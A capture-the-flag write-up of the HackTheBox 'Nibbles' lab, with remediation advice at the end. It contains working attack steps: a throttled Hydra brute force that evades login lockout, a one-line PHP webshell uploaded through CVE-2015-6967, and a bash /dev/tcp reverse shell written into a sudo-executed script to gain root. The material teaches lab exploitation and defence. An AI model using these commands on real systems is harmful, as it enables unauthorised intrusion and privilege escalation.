---
layout: post
title: "HackTheBox — Nibbles"
date: 2026-11-07
categories: [HTB, Web]
tags: [nibbleblog, cve-2015-6967, file-upload, rce, sudo, reverse-shell]
description: "Nibbleblog admin brute force → My Image plugin arbitrary file upload (CVE-2015-6967) → RCE → writable sudo monitor.sh to root."
platform: "HackTheBox"
os: "Linux"
difficulty: "Easy"
---

# HackTheBox — Nibbles

| Field          | Detail                      |
|----------------|-----------------------------|
| **OS**         | Linux (Ubuntu)              |
| **Difficulty** | Easy                        |
| **Service**    | Nibbleblog CMS              |
| **IP**         | 10.129.96.84                |

---

## Summary

Nibbles is a beginner-friendly Linux machine that walks through a full web-to-root chain:

- Content discovery of a hidden Nibbleblog install
- Version disclosure mapping to a known CVE
- Throttled brute force against a rate-limited admin panel
- Authenticated arbitrary file upload (CVE-2015-6967) for RCE
- Reverse shell as `nibbler`
- Privilege escalation through a writable script allowed by `sudo`

A single weak password combined with an outdated CMS and a misconfigured `sudo` rule results in full root compromise.

---

## Reconnaissance

### Port Scan

I started with a full TCP scan pulling versions and default scripts:

```bash
nmap -sCV -p- -vv --disable-arp-ping --min-rate 4000 10.129.96.84 -oN fullport.nmap
```

Key findings:

| Port     | State    | Service | Version                        |
|----------|----------|---------|--------------------------------|
| 22/tcp   | open     | ssh     | OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 |
| 80/tcp   | open     | http    | Apache httpd 2.4.18 (Ubuntu)   |
| 42258/tcp| filtered | unknown | no-response                    |

Only SSH and HTTP were actionable, so the web service became the focus.

### Web Stack

```bash
whatweb 10.129.96.84
```

```text
http://10.129.96.84 [200 OK] Apache[2.4.18], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.96.84]
```

Nothing but Apache 2.4.18 on the surface.

### Inspecting Port 80

The landing page looked empty in the browser, so I pulled the raw HTML:

```bash
curl http://10.129.96.84 >> index.html
vim index.html
```

The source contained a comment referencing a hidden directory:

```text
/nibbleblog/
```

Browsing to `/nibbleblog/` revealed a Nibbleblog CMS instance.

---

## Content Enumeration

I fuzzed the Nibbleblog directory for interesting files and endpoints:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt \
  -u http://10.129.96.84/nibbleblog/FUZZ \
  -e .php,.txt,.sh,.cfg,.config,.bak,.js,.html
```

Relevant results:

```text
admin.php     [Status: 200]
admin         [Status: 301]
content       [Status: 301]
plugins       [Status: 301]
themes        [Status: 301]
install.php   [Status: 200]
update.php    [Status: 200]
README        [Status: 200]
```

### Version Disclosure

The `/README` file disclosed the Nibbleblog version. That release fell within the range affected by **CVE-2015-6967**:

> Unrestricted file upload vulnerability in the My Image plugin in Nibbleblog before 4.0.5 allows remote administrators to execute arbitrary code by uploading a file with an executable extension, then accessing it via a direct request to the file in `content/private/plugins/my_image/image.php`.

The exploit requires administrator access, so the next step was getting into `admin.php`.

---

## Gaining Admin Access

### Building a Wordlist

I generated a target-specific wordlist from the site content with CeWL:

```bash
cewl http://10.129.96.84/nibbleblog/ --lower >> custom_passw.txt
cewl http://10.129.96.84/nibbleblog/ >> custom_passw.txt
```

For usernames I stuck with the obvious candidates: `admin` and `root`.

### Beating the Brute-Force Protection

Nibbleblog locks the login after a handful of failed attempts, which Burp confirmed by returning a blocking response. To stay under that threshold I throttled Hydra down to roughly two attempts per minute with a single task:

```bash
hydra -l admin -P custom_passw.txt -t 1 -W 30 10.129.96.84 \
  http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username or password"
```

```text
[80][http-post-form] host: 10.129.96.84   login: admin   password: nibbles
1 of 1 target successfully completed, 1 valid password found
```

Valid credentials recovered:

```text
admin : nibbles
```

Logging into `admin.php` with those credentials gave full control of the CMS.

---

## Exploitation — CVE-2015-6967

### Crafting the Payload

With admin access, the My Image plugin accepts an uploaded file regardless of extension. A minimal PHP webshell is enough to confirm execution:

```php
<?php system($_GET['cmd']); ?>
```

### Uploading via the My Image Plugin

I uploaded the PHP file through the plugin's configuration page (**Plugins → My image**). The upload is stored at a predictable path.

### Triggering Code Execution

Accessing the uploaded file directly executes it:

```bash
curl "http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php?cmd=id"
```

```text
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

Remote code execution confirmed as `nibbler`.

### Reverse Shell

I started a listener:

```bash
rlwrap nc -lvnp 4444
```

Then used the webshell to call back (URL-encoding a standard bash reverse shell through the `cmd` parameter). Once the connection landed, I upgraded to an interactive TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```text
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$
```

The user flag was readable from `nibbler`'s home directory.

---

## Privilege Escalation

### Situational Awareness

```bash
whoami    # nibbler
groups    # nibbler
sudo -l
```

```text
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

`nibbler` can run `monitor.sh` as root, without a password.

### Inspecting the Target

On the initial foothold, `nibbler`'s home directory only contained a `personal.zip` archive — the `personal/stuff/` structure and `monitor.sh` did not exist yet. Extracting the archive recreated them:

```bash
unzip personal.zip
```

```text
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh
```

The key detail: `monitor.sh` is owned and writable by `nibbler`, yet executed by `sudo` as **root**. Writable file + higher-privileged execution = escalation.

### Abusing the Writable Script

I overwrote the script with a reverse shell:

```bash
echo '#!/bin/bash' > /home/nibbler/personal/stuff/monitor.sh
echo '/bin/bash -i >& /dev/tcp/10.10.15.158/4444 0>&1' >> /home/nibbler/personal/stuff/monitor.sh
```

With a fresh listener running locally, I executed the script through `sudo`:

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

The listener caught a root shell, and the root flag was readable.

---

## Conclusion

The complete attack chain was:

1. Content discovery of the hidden `/nibbleblog` install
2. Version disclosure via `/README` → CVE-2015-6967
3. Throttled brute force of the admin panel (`admin : nibbles`)
4. Authenticated arbitrary file upload for RCE
5. Reverse shell as `nibbler`
6. Writable `sudo`-executed script abused for root

### Remediation

- Keep the CMS updated — the upload flaw is patched in Nibbleblog 4.0.5+.
- Enforce strong, non-dictionary admin passwords and keep anti-bruteforce in place.
- Never grant `sudo` on a script that the invoking user can modify; restrict `sudo` rules to specific trusted binaries and ensure root-run scripts are root-owned and non-writable.
